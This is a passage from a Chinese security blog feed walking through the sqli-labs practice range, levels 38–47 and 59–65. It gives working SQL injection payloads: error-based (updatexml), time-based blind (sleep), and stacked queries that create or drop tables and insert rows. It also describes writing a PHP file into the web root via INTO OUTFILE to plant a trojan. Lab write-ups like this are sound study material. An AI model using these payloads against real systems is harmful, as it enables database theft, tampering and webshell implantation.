class></p><h1 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h1><p>与Less58基本一样，也采用报错注入。只要将单引号去掉即可。</p><h4 id="获得表名"><a href="#获得表名" class="headerlink" title="获得表名"></a>获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为grox7vwdve</p><p> <img src="/posts/b894/59.png" class></p><h1 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h1><p>与Less58基本一样，也采用报错注入。只要将’改成1”)即可。</p><h4 id="获得表名-1"><a href="#获得表名-1" class="headerlink" title="获得表名"></a>获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1"<span class="token punctuation">)</span> and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为t6f0xzgydq</p><p> <img src="/posts/b894/60.png" class></p><h1 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h1><p>与Less58基本一样，也采用报错注入。只要将’改成’))即可。</p><h4 id="获得表名-2"><a href="#获得表名-2" class="headerlink" title="获得表名"></a>获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1'<span class="token punctuation">))</span> and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表名为dfgn4x3x0d</p><p> <img src="/posts/b894/61.png" class></p><h1 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h1><p>本关union和报错注入都已经失效了，那就要使用延时注入了。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1'<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schhema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span>79,1,sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里找到一个好的脚本，可以引用一下：</p><p><a href="https://www.jianshu.com/p/f1811e108d58">https://www.jianshu.com/p/f1811e108d58</a></p><p>我就直接根据脚本得到了表名和密码：</p><p> <img src="/posts/b894/62.png" class></p><h1 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h1><p>与Less-62一样，采用盲注，只需要将’)改成’即可。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schhema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span>79,1,sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同样利用脚本可得到表名和密码：</p><p> <img src="/posts/b894/63.png" class></p><h1 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h1><p>与Less-62一样，采用盲注，只需要将’)改成))即可。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token punctuation">))</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schhema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span>79,1,sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h1><p>与Less-62一样，采用盲注，只需要将’)改成”)即可。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schhema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span>79,1,sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>终于打完了sqli靶场，太不容易了。关于sql注入的知识还是非常多的，还有好多好多需要练习的地方。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli靶场(38~53关)</title>
      <link href="/posts/7e37.html"/>
      <url>/posts/7e37.html</url>
      
        <content type="html"><![CDATA[<p>第三部分主要是堆叠注入。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>浅浅地将mysql的堆叠语句列一下。</p><h3 id="Stacked-injections-堆叠注入"><a href="#Stacked-injections-堆叠注入" class="headerlink" title="Stacked injections:堆叠注入"></a>Stacked injections:堆叠注入</h3><p>堆叠注入：可以执行多条sql语句，语句之间以分号隔开。</p><p>堆叠注入实现数据库的增删查改操作：</p><h3 id="MySQL："><a href="#MySQL：" class="headerlink" title="MySQL："></a>MySQL：</h3><h4 id="（1）新建一个表"><a href="#（1）新建一个表" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>create table <span class="token function">test</span> like <span class="token function">users</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（2）删除表"><a href="#（2）删除表" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>drop table <span class="token function">test</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（3）查询数据"><a href="#（3）查询数据" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（4）加载文件"><a href="#（4）加载文件" class="headerlink" title="（4）加载文件"></a>（4）加载文件</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'C:/1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（5）修改数据"><a href="#（5）修改数据" class="headerlink" title="（5）修改数据"></a>（5）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span><span class="token string">'100'</span>,<span class="token string">'new'</span>,<span class="token string">'new'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="普通堆叠注入-Less-38-Less-45"><a href="#普通堆叠注入-Less-38-Less-45" class="headerlink" title="普通堆叠注入(Less-38~Less-45)"></a>普通堆叠注入(Less-38~Less-45)</h1><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>前面的步骤还是来一遍。</p><h3 id="采用union联合查询："><a href="#采用union联合查询：" class="headerlink" title="采用union联合查询："></a>采用union联合查询：</h3><h4 id="①判断字段数"><a href="#①判断字段数" class="headerlink" title="①判断字段数"></a>①判断字段数</h4><p>当查到4时，报错，说明字段数为3位。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="②判断注入点"><a href="#②判断注入点" class="headerlink" title="②判断注入点"></a>②判断注入点</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到注入点为2和3。</p><h4 id="③获得数据库名"><a href="#③获得数据库名" class="headerlink" title="③获得数据库名"></a>③获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到数据库名为security。</p><h4 id="④获得表名"><a href="#④获得表名" class="headerlink" title="④获得表名"></a>④获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到用户表名为users。</p><h4 id="⑤获得列名"><a href="#⑤获得列名" class="headerlink" title="⑤获得列名"></a>⑤获得列名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span>users'<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到几个有用的列名：id,username,password</p><p>进入正文啦。</p><h3 id="38-1增加一个表格test"><a href="#38-1增加一个表格test" class="headerlink" title="38.1增加一个表格test"></a>38.1增加一个表格test</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1'<span class="token punctuation">;</span>create table <span class="token function">test</span> like users--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/7e37/38.png" class></p><h3 id="38-2删除表格test"><a href="#38-2删除表格test" class="headerlink" title="38.2删除表格test"></a>38.2删除表格test</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1'<span class="token punctuation">;</span>drop table test--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/7e37/38_2.png" class></p><h3 id="38-3在表中实现增加语句"><a href="#38-3在表中实现增加语句" class="headerlink" title="38.3在表中实现增加语句"></a>38.3在表中实现增加语句</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1<span class="token string">';insert into users(id,username,password) values('</span>38<span class="token string">','</span>Less38<span class="token string">','</span>Less38'<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以在数据库中，看到此时users表中已经成功插入一列：</p><p> <img src="/posts/7e37/38_3.png" class></p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>本关和第三十八一样，只需要将第三十八的单引号去掉即可。</p><h4 id="在users表中插入一列数据："><a href="#在users表中插入一列数据：" class="headerlink" title="在users表中插入一列数据："></a>在users表中插入一列数据：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token punctuation">;</span>insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span><span class="token string">'39'</span>,<span class="token string">'Less39'</span>,<span class="token string">'Less39'</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以在数据库中，看到此时users表中已经成功插入一列：</p><p> <img src="/posts/7e37/39.png" class></p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>本关和第三十八一样，只需要将第三十八关的’改为’)即可</p><h4 id="在users表中插入一列数据：-1"><a href="#在users表中插入一列数据：-1" class="headerlink" title="在users表中插入一列数据："></a>在users表中插入一列数据：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">'); insert into users(id,username,password) values('</span>40<span class="token string">','</span>Less-40<span class="token string">','</span>Less-40'<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以在数据库中，看到此时users表中已经成功插入一列：</p><p> <img src="/posts/7e37/40.png" class></p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>此处与 less-39 是一致的，区别在于 41 错误不回显。所以我们称之为盲注。</p><h4 id="在users表中插入一列数据：-2"><a href="#在users表中插入一列数据：-2" class="headerlink" title="在users表中插入一列数据："></a>在users表中插入一列数据：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token punctuation">;</span>insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span><span class="token string">'41'</span>,<span class="token string">'Less41'</span>,<span class="token string">'Less41'</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以在数据库中，看到此时users表中已经成功插入一列：</p><p> <img src="/posts/7e37/41.png" class></p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>分析源代码后，得知password 变量在 post 过程中，没有通过 mysql_real_escape_string()函数的处理。因此在登录</p><p>的时候密码选项我们可以进行攻击。</p><h3 id="42-1创建一个名为Less42的表格"><a href="#42-1创建一个名为Less42的表格" class="headerlink" title="42.1创建一个名为Less42的表格"></a>42.1创建一个名为Less42的表格</h3><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1'<span class="token punctuation">;</span>create table Less42 like <span class="token function">users</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里要注意一下，表名不能是纯数字，不然创建不了的哦。</p><p>可以看到已经成功将Less42的表添加：</p><p> <img src="/posts/7e37/42.png" class></p><h3 id="42-2删除名为Less42的表"><a href="#42-2删除名为Less42的表" class="headerlink" title="42.2删除名为Less42的表"></a>42.2删除名为Less42的表</h3><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1'<span class="token punctuation">;</span>drop table Less42<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功将Less42的表删除：</p><p> <img src="/posts/7e37/42_2.png" class></p><h3 id="42-3在users表中插入一行数据"><a href="#42-3在users表中插入一行数据" class="headerlink" title="42.3在users表中插入一行数据"></a>42.3在users表中插入一行数据</h3><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1<span class="token string">';insert into users(id,username,password) values('</span>42<span class="token string">','</span>Less42<span class="token string">','</span>Less42'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功在users表中添加了一列：</p><p> <img src="/posts/7e37/42_3.png" class></p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>本关和第四十二关原理一致，只需要将第四十二关的’换成’)即可。</p><h4 id="创建一个名为Less43的表格"><a href="#创建一个名为Less43的表格" class="headerlink" title="创建一个名为Less43的表格"></a>创建一个名为Less43的表格</h4><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1'<span class="token punctuation">)</span><span class="token punctuation">;</span>create table Less43 like <span class="token function">users</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="这里要注意一下，表名不能是纯数字，不然创建不了的哦。"><a href="#这里要注意一下，表名不能是纯数字，不然创建不了的哦。" class="headerlink" title="这里要注意一下，表名不能是纯数字，不然创建不了的哦。"></a>这里要注意一下，表名不能是纯数字，不然创建不了的哦。</h5><p>可以看到已经成功将Less43的表添加：</p><p> <img src="/posts/7e37/43.png" class></p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>这关与 42 关的区别就在于没有报错信息，但是跟我们用堆叠注入没有什么关系，所以我们可以使用同样方式的 payload。</p><h4 id="在users表中插入一行数据"><a href="#在users表中插入一行数据" class="headerlink" title="在users表中插入一行数据"></a>在users表中插入一行数据</h4><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1<span class="token string">';insert into users(id,username,password) values('</span>44<span class="token string">','</span>Less44<span class="token string">','</span>Less44'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功在users表中添加了一列：</p><p> <img src="/posts/7e37/44.png" class></p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>同样的，45 关与 43 关的 payload 是一样的，只不过 45 关依旧没有报错。</p><h4 id="创建一个名为Less45的表格"><a href="#创建一个名为Less45的表格" class="headerlink" title="创建一个名为Less45的表格"></a>创建一个名为Less45的表格</h4><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1'<span class="token punctuation">)</span><span class="token punctuation">;</span>create table Less45 like <span class="token function">users</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里要注意一下，表名不能是纯数字，不然创建不了的哦。</p><p>可以看到已经成功将Less45的表添加：</p><p> <img src="/posts/7e37/45.png" class></p><h1 id="order-by后的注入-Less-46-Less-49"><a href="#order-by后的注入-Less-46-Less-49" class="headerlink" title="order by后的注入(Less-46~Less-49)"></a>order by后的注入(Less-46~Less-49)</h1><p>一般来说，尝试?sort=1 desc和?sort=1 asc</p><p>如果显示结果不同，则表明可以注入。</p><p>（其中，desc表示降序排列 ，asc表示升序排列，默认是asc。）</p><h3 id="（1）order-by后的数字可以作为一个注入点"><a href="#（1）order-by后的数字可以作为一个注入点" class="headerlink" title="（1）order by后的数字可以作为一个注入点"></a>（1）order by后的数字可以作为一个注入点</h3><p>①直接添加语句，?sort=(select……)</p><p>②利用一些函数。例如rand()函数等。?sort=rand(sql语句)</p><p>③利用and，例如?sort=1 and (加sql语句)</p><h3 id="（2）procedure-analyse参数后注入"><a href="#（2）procedure-analyse参数后注入" class="headerlink" title="（2）procedure analyse参数后注入"></a>（2）procedure analyse参数后注入</h3><pre class="line-numbers language-bash"><code class="language-bash">例如：sort<span class="token operator">=</span>1 procedure analyse<span class="token punctuation">(</span>sql语句<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（3）导入导出文件into-outfile参数"><a href="#（3）导入导出文件into-outfile参数" class="headerlink" title="（3）导入导出文件into outfile参数"></a>（3）导入导出文件into outfile参数</h3><p>将查询结果导入到文件当中：</p><pre class="line-numbers language-bash"><code class="language-bash">例如：?sort<span class="token operator">=</span>1 into outfile <span class="token string">"C:\\phpstudy\\www\\sqli\\a.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用lines terminated by，上传木马:</p><pre class="line-numbers language-bash"><code class="language-bash">?sort<span class="token operator">=</span>1 into outfile C:\\phpstudy\\www\\a.txt lines terminated by 0x<span class="token punctuation">(</span>木马进行十六进制转换<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>关于order by后的一些参数进行注入：</p><p>本关的 sql 语句为：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY <span class="token variable">$id</span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试?sort=1 desc和?sort=1 asc</p><p>如果显示结果不同，则表明可以注入。</p><p>并且，我们的注入点在 order by 后面的参数中，order by后为数字。</p><h3 id="（1）利用报错注入"><a href="#（1）利用报错注入" class="headerlink" title="（1）利用报错注入"></a>（1）利用报错注入</h3><h4 id="①获得数据库用户名"><a href="#①获得数据库用户名" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：?sort<span class="token operator">=</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>或者?sort<span class="token operator">=</span>rand<span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>或者?sort<span class="token operator">=</span>1 and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/7e37/46.png" class></p><h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：?sort<span class="token operator">=</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>或者?sort<span class="token operator">=</span>rand<span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>或者?sort<span class="token operator">=</span>1 and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/7e37/46_2.png" class></p><h3 id="（2）利用延时注入"><a href="#（2）利用延时注入" class="headerlink" title="（2）利用延时注入"></a>（2）利用延时注入</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1 and <span class="token punctuation">(</span>if<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里可以用burp对字符a爆破，得到数据库名第一个字符为s。</p><p> <img src="/posts/7e37/46_3.png" class></p><h3 id="（3）导入导出文件-into-outfile-参数"><a href="#（3）导入导出文件-into-outfile-参数" class="headerlink" title="（3）导入导出文件 into outfile 参数"></a>（3）导入导出文件 into outfile 参数</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1 into outfile <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-46\\test.txt"</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时查询结果已经导入到test.txt文件当中了:</p><p> <img src="/posts/7e37/46_4.png" class></p><h3 id="（4）利用-lines-terminated-by上传木马"><a href="#（4）利用-lines-terminated-by上传木马" class="headerlink" title="（4）利用 lines terminated by上传木马"></a>（4）利用 lines terminated by上传木马</h3><pre class="line-numbers language-bash"><code class="language-bash">将<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>转换为十六进制：3c3f70687020706870696e666f28293b3f3epayload:sort<span class="token operator">=</span>1 into outfile <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-47\\test.php"</span>lines terminated by 0x3c3f70687020706870696e666f28293b3f3e--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，可以成功访问text.php：</p><p> <img src="/posts/7e37/46_5.png" class></p><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>本关的 sql 语句为：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY '<span class="token variable">$id</span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本关order by后为字符。</p><h3 id="（1）利用报错注入-1"><a href="#（1）利用报错注入-1" class="headerlink" title="（1）利用报错注入"></a>（1）利用报错注入</h3><h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:sort<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（2）利用延时注入-1"><a href="#（2）利用延时注入-1" class="headerlink" title="（2）利用延时注入"></a>（2）利用延时注入</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sort<span class="token operator">=</span>1<span class="token string">' and (if(substr(user(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里可以用burp对字符a爆破，得到数据库用户名第一个字符为r。</p><p> <img src="/posts/7e37/47.png" class></p><h3 id="（3）导入导出文件-into-outfile-参数-1"><a href="#（3）导入导出文件-into-outfile-参数-1" class="headerlink" title="（3）导入导出文件 into outfile 参数"></a>（3）导入导出文件 into outfile 参数</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1'into outfile <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-47\\test.txt"</span>--+<span aria-hidden="true" 